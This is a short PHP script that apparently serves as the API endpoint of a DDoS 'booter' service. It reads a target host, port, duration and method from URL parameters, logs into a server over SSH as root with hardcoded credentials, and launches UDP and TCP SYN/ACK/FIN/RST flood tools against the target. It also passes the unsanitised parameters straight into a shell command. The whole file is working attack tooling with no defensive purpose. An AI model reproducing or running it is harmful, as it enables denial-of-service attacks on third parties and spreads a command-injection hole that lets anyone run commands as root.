<?php
ignore_user_abort(true);
set_time_limit(0);

$server_ip = "1.1.1.1";
$server_pass = "password";
$server_user = "root";

$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = strtoupper($_GET['method']);

if ($method == "SUDP") { $command = "screen -dm sudo ./udpbypass {$host} {$port} {$time} 50"; }
if ($method == "BYPASS") { $command = "screen -dm sudo ./google {$host} {$port} 10 {$time} "; }
if ($method == "UDP-FREE") { $command = "screen -dm sudo ./udpbypass {$host} {$port} {$time} 1"; }
if ($method == "NFO") { $command = "screen -dm sudo ./119 {$host} {$port} 1 1 {$time}"; }
if ($method == "OVH") { $command = "screen -dm sudo ./sudp111 {$host} {$port} 1 1 {$time}"; }
if ($method == "ANON") { $command = "screen -dm sudo ./TOT {$host} {$port} 1 1 {$time}"; }
if ($method == "ACK") { $command = "screen -dm sudo ./TCP  {$host} {$port} 50 -1 {$time} ack"; }
if ($method == "SYN") { $command = "screen -dm sudo ./TCP  {$host} {$port} 50 -1 {$time} syn"; }
if ($method == "FIN") { $command = "screen -dm sudo ./TCP  {$host} {$port} 50 -1 {$time} fin"; }
if ($method == "PSH") { $command = "screen -dm sudo ./TCP  {$host} {$port} 50 -1 {$time} psh"; }
if ($method == "RST") { $command = "screen -dm sudo ./TCP  {$host} {$port} 50 -1 {$time} rst"; }
if ($method == "SEQ") { $command = "screen -dm sudo ./TCP  {$host} {$port} 50 -1 {$time} seq"; }
if ($method == "STOP") { $command = "pkill screen"; }

if (!function_exists("ssh2_connect")) die("Function ssh2_connect doesn't exist");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {

    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Bad Login";
    } else {

        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: Unable to Execute Command\n";
        } else {

            stream_set_blocking($stream, true);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Ready Use";
            fclose($stream);
        }
    }
}
